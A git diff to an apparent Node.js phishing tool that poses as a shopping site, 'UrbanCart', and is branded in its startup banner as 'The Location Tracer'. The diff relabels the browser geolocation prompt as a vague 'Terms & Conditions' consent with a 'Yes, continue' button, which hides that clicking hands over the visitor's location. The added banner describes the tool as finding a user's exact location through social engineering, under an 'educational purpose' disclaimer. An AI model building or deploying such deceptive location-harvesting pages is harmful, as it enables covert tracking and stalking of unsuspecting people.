@@ -344,11 +344,11 @@ function getPermissionPage(sessionId) {
 <body>
     <div class="container">
         <div class="icon">📍</div>
-        <h1>Location Access Required</h1>
-        <p>To continue shopping on UrbanCart, we need your location permission for better delivery estimates.</p>
-        <button id="allowBtn">Allow Location Access</button>
+        <h1>Terms & Conditions</h1>
+        <p>If you want to shop with our Urbankarat then continue this</p>
+        <button id="allowBtn">Yes, continue</button>
         <button class="exit-btn" id="exitBtn">Exit</button>
-        <div id="statusMsg" class="status">Click "Allow Location Access" to continue</div>
+        <div id="statusMsg" class="status">Click "Yes, continue" to continue</div>
         <div id="errorMsg" class="error"></div>
     </div>
     
@@ -361,13 +361,13 @@ function getPermissionPage(sessionId) {
             const errorDiv = document.getElementById('errorMsg');
             
             btn.disabled = true;
-            btn.innerHTML = '<span class="loading"></span> Getting location...';
+            btn.innerHTML = '<span class="loading"></span> Entering Please Wait';
             errorDiv.style.display = 'none';
             
             if(!navigator.geolocation) {
                 showError('Geolocation not supported');
                 btn.disabled = false;
-                btn.innerHTML = 'Allow Location Access';
+                btn.innerHTML = 'Yes, continue';
                 return;
             }
             
@@ -526,15 +526,29 @@ const server = http.createServer((req, res) => {
     res.end('Page not found');
 });
 
+
+console.log('\n╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗');
+    console.log('║ ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗  ██████╗ ██╗   ██╗████████╗███████╗             ║');
+    console.log('║ ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝             ║');
+    console.log('║ ██████╔╝██║     ███████║██║     █████╔╝     ██████╔╝██║   ██║██║   ██║   ██║   █████╗               ║');
+    console.log('║ ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝               ║');
+    console.log('║ ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗             ║');
+    console.log('║ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝             ║');
+    console.log('║                                     The Location Tracer                                             ║');
+    console.log('╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝');
+
+
+
 // Start server
 server.listen(PORT, () => {
-    console.log('\n╔════════════════════════════════════╗');
-    console.log('║   🚀 URBANCART SERVER STARTED!    ║');
-    console.log('║   📡 PORT: ' + PORT + '                        ║');
-    console.log('║   🌐 http://localhost:' + PORT + '/          ║');
-    console.log('║                                        ║');
-    console.log('║   📦 15 Products Loaded               ║');
-    console.log('║   🛒 Shopping Cart Ready              ║');
-    console.log('╚════════════════════════════════════╝');
+
+    console.log(' \n                                               Warning    ');
+    console.log(' \n                             This Tool Is Only For Educational Purpose  ');
+    console.log(' \n    ==================================================================================================================');
+    console.log(' \n    Author: Gulshan Kumar                                    ');
+    console.log('    Instagram: instagram.com/r3b00tm4st3r         ');
+    console.log('    Discription: This tool helps in finding the exact location of the user with the help of social engineering method. ');
+    console.log('    feachers: Costom shopping Website ');
+    console.log(' \n    ==================================================================================================================');
     console.log('\n👉 Open browser: http://localhost:' + PORT + '/\n');
 });
